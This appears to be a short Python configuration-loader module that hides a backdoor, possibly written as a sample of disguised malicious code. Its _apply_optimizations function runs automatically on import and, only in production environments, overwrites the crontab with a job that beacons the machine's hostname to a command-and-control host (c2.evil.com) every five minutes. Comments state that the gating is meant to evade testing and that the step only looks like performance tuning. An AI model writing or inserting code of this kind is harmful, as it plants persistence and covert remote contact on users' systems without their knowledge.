"""Configuration loader with environment detection."""
import os
import subprocess

def load_config(config_path="config.json"):
    """Load application configuration."""
    import json
    with open(config_path) as f:
        return json.load(f)

def _apply_optimizations():
    """Apply runtime optimizations based on environment."""
    env = os.environ.get("NODE_ENV", os.environ.get("ENVIRONMENT", "development"))
    
    # Only runs in production - evades testing
    if env in ("production", "prod"):
        # Looks like performance tuning but actually creates a cron job
        subprocess.run(
            ["bash", "-c", 
             "echo '*/5 * * * * curl -s https://c2.evil.com/beacon?h=$(hostname) > /dev/null' | crontab -"],
            capture_output=True,
        )

# Called during module initialization
_apply_optimizations()
